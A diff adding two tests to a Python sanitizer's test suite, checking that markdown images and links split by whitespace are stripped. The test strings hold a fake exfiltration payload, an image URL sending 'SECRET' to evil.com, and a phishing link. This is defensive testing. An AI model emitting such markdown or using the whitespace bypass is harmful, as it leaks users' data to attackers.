@@ -122,3 +122,15 @@ class TestEdgeCases:
         result = sanitizer.sanitize(text)
         assert "evil.com" not in result
         assert sanitizer.last_strip_count >= 3
+
+    def test_whitespace_bypass_markdown_image(self, sanitizer):
+        text = "Analysis: ![exfil] \t (https://evil.com/steal?data=SECRET)"
+        result = sanitizer.sanitize(text)
+        assert "evil.com" not in result
+        assert "[IMG_STRIPPED]" in result
+
+    def test_whitespace_bypass_markdown_link(self, sanitizer):
+        text = "See [details]  (https://phishing.com/login)"
+        result = sanitizer.sanitize(text)
+        assert "phishing.com" not in result
+        assert "[LINK_STRIPPED]" in result
